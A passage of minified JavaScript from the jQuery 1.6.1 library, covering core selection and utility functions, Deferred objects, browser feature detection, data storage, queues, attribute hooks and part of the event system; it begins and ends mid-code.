b,c,d,e,g,h,i,j,k,l,m,n,o,p=[],q=[],r=f._data(this,"events");if(!(a.liveFired===this||!r||!r.live||a.target.disabled||a.button&&a.type==="click")){a.namespace&&(n=new RegExp("(^|\\.)"+a.namespace.split(".").join("\\.(?:.*\\.)?")+"(\\.|$)")),a.liveFired=this;var s=r.live.slice(0);for(i=0;i<s.length;i++)g=s[i],g.origType.replace(y,"")===a.type?q.push(g.selector):s.splice(i--,1);e=f(a.target).closest(q,a.currentTarget);for(j=0,k=e.length;j<k;j++){m=e[j];for(i=0;i<s.length;i++){g=s[i];if(m.selector===g.selector&&(!n||n.test(g.namespace))&&!m.elem.disabled){h=m.elem,d=null;if(g.preType==="mouseenter"||g.preType==="mouseleave")a.type=g.preType,d=f(a.relatedTarget).closest(g.selector)[0],d&&f.contains(h,d)&&(d=h);(!d||d!==h)&&p.push({elem:h,handleObj:g,level:m.level})}}}for(j=0,k=p.length;j<k;j++){e=p[j];if(c&&e.level>c)break;a.currentTarget=e.elem,a.data=e.handleObj.data,a.handleObj=e.handleObj,o=e.handleObj.origHandler.apply(e.elem,arguments);if(o===!1||a.isPropagationStopped()){c=e.level,o===!1&&(b=!1);if(a.isImmediatePropagationStopped())break}}return b}}function L(a,c,d){var e=f.extend({},d[0]);e.type=a,e.originalEvent={},e.liveFired=b,f.event.handle.call(c,e),e.isDefaultPrevented()&&d[0].preventDefault()}function F(){return!0}function E(){return!1}function m(a,c,d){var e=c+"defer",g=c+"queue",h=c+"mark",i=f.data(a,e,b,!0);i&&(d==="queue"||!f.data(a,g,b,!0))&&(d==="mark"||!f.data(a,h,b,!0))&&setTimeout(function(){!f.data(a,g,b,!0)&&!f.data(a,h,b,!0)&&(f.removeData(a,e,!0),i.resolve())},0)}function l(a){for(var b in a)if(b!=="toJSON")return!1;return!0}function k(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(j,"$1-$2").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNaN(d)?i.test(d)?f.parseJSON(d):d:parseFloat(d)}catch(g){}f.data(a,c,d)}else d=b}return d}var c=a.document,d=a.navigator,e=a.location,f=function(){function H(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(H,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/\d/,n=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,o=/^[\],:{}\s]*$/,p=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,q=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,r=/(?:^|:|,)(?:\s*\[)+/g,s=/(webkit)[ \/]([\w.]+)/,t=/(opera)(?:.*version)?[ \/]([\w.]+)/,u=/(msie) ([\w.]+)/,v=/(mozilla)(?:.*? rv:([\w.]+))?/,w=d.userAgent,x,y,z,A=Object.prototype.toString,B=Object.prototype.hasOwnProperty,C=Array.prototype.push,D=Array.prototype.slice,E=String.prototype.trim,F=Array.prototype.indexOf,G={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=n.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.6.1",length:0,size:function(){return this.length},toArray:function(){return D.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?C.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),y.done(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(D.apply(this,arguments),"slice",D.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:C,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;y.resolveWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").unbind("ready")}},bindReady:function(){if(!y){y=e._Deferred();if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",z,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",z),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&H()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNaN:function(a){return a==null||!m.test(a)||isNaN(a)},type:function(a){return a==null?String(a):G[A.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;if(a.constructor&&!B.call(a,"constructor")&&!B.call(a.constructor.prototype,"isPrototypeOf"))return!1;var c;for(c in a);return c===b||B.call(a,c)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw a},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(o.test(b.replace(p,"@").replace(q,"]").replace(r,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(b,c,d){a.DOMParser?(d=new DOMParser,c=d.parseFromString(b,"text/xml")):(c=new ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b)),d=c.documentElement,(!d||!d.nodeName||d.nodeName==="parsererror")&&e.error("Invalid XML: "+b);return c},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:E?function(a){return a==null?"":E.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?C.call(c,a):e.merge(c,a)}return c},inArray:function(a,b){if(F)return F.call(b,a);for(var c=0,d=b.length;c<d;c++)if(b[c]===a)return c;return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=D.call(arguments,2),g=function(){return a.apply(c,f.concat(D.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=s.exec(a)||t.exec(a)||u.exec(a)||a.indexOf("compatible")<0&&v.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){G["[object "+b+"]"]=b.toLowerCase()}),x=e.uaMatch(w),x.browser&&(e.browser[x.browser]=!0,e.browser.version=x.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?z=function(){c.removeEventListener("DOMContentLoaded",z,!1),e.ready()}:c.attachEvent&&(z=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",z),e.ready())});return e}(),g="done fail isResolved isRejected promise then always pipe".split(" "),h=[].slice;f.extend({_Deferred:function(){var a=[],b,c,d,e={done:function(){if(!d){var c=arguments,g,h,i,j,k;b&&(k=b,b=0);for(g=0,h=c.length;g<h;g++)i=c[g],j=f.type(i),j==="array"?e.done.apply(e,i):j==="function"&&a.push(i);k&&e.resolveWith(k[0],k[1])}return this},resolveWith:function(e,f){if(!d&&!b&&!c){f=f||[],c=1;try{while(a[0])a.shift().apply(e,f)}finally{b=[e,f],c=0}}return this},resolve:function(){e.resolveWith(this,arguments);return this},isResolved:function(){return!!c||!!b},cancel:function(){d=1,a=[];return this}};return e},Deferred:function(a){var b=f._Deferred(),c=f._Deferred(),d;f.extend(b,{then:function(a,c){b.done(a).fail(c);return this},always:function(){return b.done.apply(b,arguments).fail.apply(this,arguments)},fail:c.done,rejectWith:c.resolveWith,reject:c.resolve,isRejected:c.isResolved,pipe:function(a,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[c,"reject"]},function(a,c){var e=c[0],g=c[1],h;f.isFunction(e)?b[a](function(){h=e.apply(this,arguments),h&&f.isFunction(h.promise)?h.promise().then(d.resolve,d.reject):d[g](h)}):b[a](d[g])})}).promise()},promise:function(a){if(a==null){if(d)return d;d=a={}}var c=g.length;while(c--)a[g[c]]=b[g[c]];return a}}),b.done(c.cancel).fail(b.cancel),delete b.cancel,a&&a.call(b,b);return b},when:function(a){function i(a){return function(c){b[a]=arguments.length>1?h.call(arguments,0):c,--e||g.resolveWith(g,h.call(b,0))}}var b=arguments,c=0,d=b.length,e=d,g=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred();if(d>1){for(;c<d;c++)b[c]&&f.isFunction(b[c].promise)?b[c].promise().then(i(c),g.reject):--e;e||g.resolveWith(g,b)}else g!==a&&g.resolveWith(g,d?[a]:[]);return g.promise()}}),f.support=function(){var a=c.createElement("div"),b=c.documentElement,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r;a.setAttribute("className","t"),a.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=a.getElementsByTagName("*"),e=a.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};f=c.createElement("select"),g=f.appendChild(c.createElement("option")),h=a.getElementsByTagName("input")[0],j={leadingWhitespace:a.firstChild.nodeType===3,tbody:!a.getElementsByTagName("tbody").length,htmlSerialize:!!a.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55$/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:h.value==="on",optSelected:g.selected,getSetAttribute:a.className!=="t",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},h.checked=!0,j.noCloneChecked=h.cloneNode(!0).checked,f.disabled=!0,j.optDisabled=!g.disabled;try{delete a.test}catch(s){j.deleteExpando=!1}!a.addEventListener&&a.attachEvent&&a.fireEvent&&(a.attachEvent("onclick",function b(){j.noCloneEvent=!1,a.detachEvent("onclick",b)}),a.cloneNode(!0).fireEvent("onclick")),h=c.createElement("input"),h.value="t",h.setAttribute("type","radio"),j.radioValue=h.value==="t",h.setAttribute("checked","checked"),a.appendChild(h),k=c.createDocumentFragment(),k.appendChild(a.firstChild),j.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,a.innerHTML="",a.style.width=a.style.paddingLeft="1px",l=c.createElement("body"),m={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"};for(q in m)l.style[q]=m[q];l.appendChild(a),b.insertBefore(l,b.firstChild),j.appendChecked=h.checked,j.boxModel=a.offsetWidth===2,"zoom"in a.style&&(a.style.display="inline",a.style.zoom=1,j.inlineBlockNeedsLayout=a.offsetWidth===2,a.style.display="",a.innerHTML="<div style='width:4px;'></div>",j.shrinkWrapBlocks=a.offsetWidth!==2),a.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",n=a.getElementsByTagName("td"),r=n[0].offsetHeight===0,n[0].style.display="",n[1].style.display="none",j.reliableHiddenOffsets=r&&n[0].offsetHeight===0,a.innerHTML="",c.defaultView&&c.defaultView.getComputedStyle&&(i=c.createElement("div"),i.style.width="0",i.style.marginRight="0",a.appendChild(i),j.reliableMarginRight=(parseInt((c.defaultView.getComputedStyle(i,null)||{marginRight:0}).marginRight,10)||0)===0),l.innerHTML="",b.removeChild(l);if(a.attachEvent)for(q in{submit:1,change:1,focusin:1})p="on"+q,r=p in a,r||(a.setAttribute(p,"return;"),r=typeof a[p]=="function"),j[q+"Bubbles"]=r;return j}(),f.boxModel=f.support.boxModel;var i=/^(?:\{.*\}|\[.*\])$/,j=/([a-z])([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!l(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g=f.expando,h=typeof c=="string",i,j=a.nodeType,k=j?f.cache:a,l=j?a[f.expando]:a[f.expando]&&f.expando;if((!l||e&&l&&!k[l][g])&&h&&d===b)return;l||(j?a[f.expando]=l=++f.uuid:l=f.expando),k[l]||(k[l]={},j||(k[l].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?k[l][g]=f.extend(k[l][g],c):k[l]=f.extend(k[l],c);i=k[l],e&&(i[g]||(i[g]={}),i=i[g]),d!==b&&(i[f.camelCase(c)]=d);if(c==="events"&&!i[c])return i[g]&&i[g].events;return h?i[f.camelCase(c)]:i}},removeData:function(b,c,d){if(!!f.acceptData(b)){var e=f.expando,g=b.nodeType,h=g?f.cache:b,i=g?b[f.expando]:f.expando;if(!h[i])return;if(c){var j=d?h[i][e]:h[i];if(j){delete j[c];if(!l(j))return}}if(d){delete h[i][e];if(!l(h[i]))return}var k=h[i][e];f.support.deleteExpando||h!=a?delete h[i]:h[i]=null,k?(h[i]={},g||(h[i].toJSON=f.noop),h[i][e]=k):g&&(f.support.deleteExpando?delete b[f.expando]:b.removeAttribute?b.removeAttribute(f.expando):b[f.expando]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d=null;if(typeof a=="undefined"){if(this.length){d=f.data(this[0]);if(this[0].nodeType===1){var e=this[0].attributes,g;for(var h=0,i=e.length;h<i;h++)g=e[h].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),k(this[0],g,d[g]))}}return d}if(typeof a=="object")return this.each(function(){f.data(this,a)});var j=a.split(".");j[1]=j[1]?"."+j[1]:"";if(c===b){d=this.triggerHandler("getData"+j[1]+"!",[j[0]]),d===b&&this.length&&(d=f.data(this[0],a),d=k(this[0],a,d));return d===b&&j[1]?this.data(j[0]):d}return this.each(function(){var b=f(this),d=[j[0],c];b.triggerHandler("setData"+j[1]+"!",d),f.data(this,a,c),b.triggerHandler("changeData"+j[1]+"!",d)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,c){a&&(c=(c||"fx")+"mark",f.data(a,c,(f.data(a,c,b,!0)||0)+1,!0))},_unmark:function(a,c,d){a!==!0&&(d=c,c=a,a=!1);if(c){d=d||"fx";var e=d+"mark",g=a?0:(f.data(c,e,b,!0)||1)-1;g?f.data(c,e,g,!0):(f.removeData(c,e,!0),m(c,d,"mark"))}},queue:function(a,c,d){if(a){c=(c||"fx")+"queue";var e=f.data(a,c,b,!0);d&&(!e||f.isArray(d)?e=f.data(a,c,f.makeArray(d),!0):e.push(d));return e||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e;d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),d.call(a,function(){f.dequeue(a,b)})),c.length||(f.removeData(a,b+"queue",!0),m(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(){var c=this;setTimeout(function(){f.dequeue(c,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f._Deferred(),!0))h++,l.done(m);m();return d.promise()}});var n=/[\n\t\r]/g,o=/\s+/,p=/\r/g,q=/^(?:button|input)$/i,r=/^(?:button|input|object|select|textarea)$/i,s=/^a(?:rea)?$/i,t=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,u=/\:/,v,w;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.addClass(a.call(this,b,c.attr("class")||""))});if(a&&typeof a=="string"){var b=(a||"").split(o);for(var c=0,d=this.length;c<d;c++){var e=this[c];if(e.nodeType===1)if(!e.className)e.className=a;else{var g=" "+e.className+" ",h=e.className;for(var i=0,j=b.length;i<j;i++)g.indexOf(" "+b[i]+" ")<0&&(h+=" "+b[i]);e.className=f.trim(h)}}}return this},removeClass:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.removeClass(a.call(this,b,c.attr("class")))});if(a&&typeof a=="string"||a===b){var c=(a||"").split(o);for(var d=0,e=this.length;d<e;d++){var g=this[d];if(g.nodeType===1&&g.className)if(a){var h=(" "+g.className+" ").replace(n," ");for(var i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){var d=f(this);d.toggleClass(a.call(this,c,d.attr("class"),b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(o);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ";for(var c=0,d=this.length;c<d;c++)if((" "+this[c].className+" ").replace(n," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e=this[0];if(!arguments.length){if(e){c=f.valHooks[e.nodeName.toLowerCase()]||f.valHooks[e.type];if(c&&"get"in c&&(d=c.get(e,"value"))!==b)return d;return(e.value||"").replace(p,"")}return b}var g=f.isFunction(a);return this.each(function(d){var e=f(this),h;if(this.nodeType===1){g?h=a.call(this,d,e.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c=a.selectedIndex,d=[],e=a.options,g=a.type==="select-one";if(c<0)return null;for(var h=g?c:0,i=g?c+1:e.length;h<i;h++){var j=e[h];if(j.selected&&(f.support.optDisabled?!j.disabled:j.getAttribute("disabled")===null)&&(!j.parentNode.disabled||!f.nodeName(j.parentNode,"optgroup"))){b=f(j).val();if(g)return b;d.push(b)}}if(g&&!d.length&&e.length)return f(e[c]).val();return d},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attrFix:{tabindex:"tabIndex"},attr:function(a,c,d,e){var g=a.nodeType;if(!a||g===3||g===8||g===2)return b;if(e&&c in f.attrFn)return f(a)[c](d);if(!("getAttribute"in a))return f.prop(a,c,d);var h,i,j=g!==1||!f.isXMLDoc(a);c=j&&f.attrFix[c]||c,i=f.attrHooks[c],i||(!t.test(c)||typeof d!="boolean"&&d!==b&&d.toLowerCase()!==c.toLowerCase()?v&&(f.nodeName(a,"form")||u.test(c))&&(i=v):i=w);if(d!==b){if(d===null){f.removeAttr(a,c);return b}if(i&&"set"in i&&j&&(h=i.set(a,d,c))!==b)return h;a.setAttribute(c,""+d);return d}if(i&&"get"in i&&j)return i.get(a,c);h=a.getAttribute(c);return h===null?b:h},removeAttr:function(a,b){var c;a.nodeType===1&&(b=f.attrFix[b]||b,f.support.getSetAttribute?a.removeAttribute(b):(f.attr(a,b,""),a.removeAttributeNode(a.getAttributeNode(b))),t.test(b)&&(c=f.propFix[b]||b)in a&&(a[c]=!1))},attrHooks:{type:{set:function(a,b){if(q.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},tabIndex:{get:function(a){var c=a.getAttributeNode("tabIndex");return c&&c.specified?parseInt(c.value,10):r.test(a.nodeName)||s.test(a.nodeName)&&a.href?0:b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e=a.nodeType;if(!a||e===3||e===8||e===2)return b;var g,h,i=e!==1||!f.isXMLDoc(a);c=i&&f.propFix[c]||c,h=f.propHooks[c];return d!==b?h&&"set"in h&&(g=h.set(a,d,c))!==b?g:a[c]=d:h&&"get"in h&&(g=h.get(a,c))!==b?g:a[c]},propHooks:{}}),w={get:function(a,c){return a[f.propFix[c]||c]?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=b),a.setAttribute(c,c.toLowerCase()));return c}},f.attrHooks.value={get:function(a,b){if(v&&f.nodeName(a,"button"))return v.get(a,b);return a.value},set:function(a,b,c){if(v&&f.nodeName(a,"button"))return v.set(a,b,c);a.value=b}},f.support.getSetAttribute||(f.attrFix=f.propFix,v=f.attrHooks.name=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&d.nodeValue!==""?d.nodeValue:b},set:function(a,b,c){var d=a.getAttributeNode(c);if(d){d.nodeValue=b;return b}}},f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})})),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex)}})),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var x=Object.prototype.hasOwnProperty,y=/\.(.*)$/,z=/^(?:textarea|input|select)$/i,A=/\./g,B=/ /g,C=/[^\w\s.|`]/g,D=function(a){return a.replace(C,"\\$&")};f.event={add:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){if(d===!1)d=E;else if(!d)return;var g,h;d.handler&&(g=d,d=g.handler),d.guid||(d.guid=f.guid++);var i=f._data(a);if(!i)return;var j=i.events,k=i.handle;j||(i.events=j={}),k||(i.handle=k=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.handle.apply(k.elem,arguments):b}),k.elem=a,c=c.split(" ");var l,m=0,n;while(l=c[m++]){h=g?f.extend({},g):{handler:d,data:e},l.indexOf(".")>-1?(n=l.split("."),l=n.shift(),h.namespace=n.slice(0).sort().join(".")):(n=[],h.namespace=""),h.type=l,h.guid||(h.guid=d.guid);var o=j[l],p=f.event.special[l]||{};if(!o){o=j[l]=[];if(!p.setup||p.setup.call(a,e,n,k)===!1)a.addEventListener?a.addEventListener(l,k,!1):a.attachEvent&&a.attachEvent("on"+l,k)}p.add&&(p.add.call(a,h),h.handler.guid||(h.handler.guid=d.guid)),o.push(h),f.event.global[l]=!0}a=null}},global:{},remove:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){d===!1&&(d=E);var g,h,i,j,k=0,l,m,n,o,p,q,r,s=f.hasData(a)&&f._data(a),t=s&&s.events;if(!s||!t)return;c&&c.type&&(d=c.handler,c=c.type);if(!c||typeof c=="string"&&c.charAt(0)==="."){c=c||"";for(h in t)f.event.remove(a,h+c);return}c=c.split(" ");while(h=c[k++]){r=h,q=null,l=h.indexOf(".")<0,m=[],l||(m=h.split("."),h=m.shift(),n=new 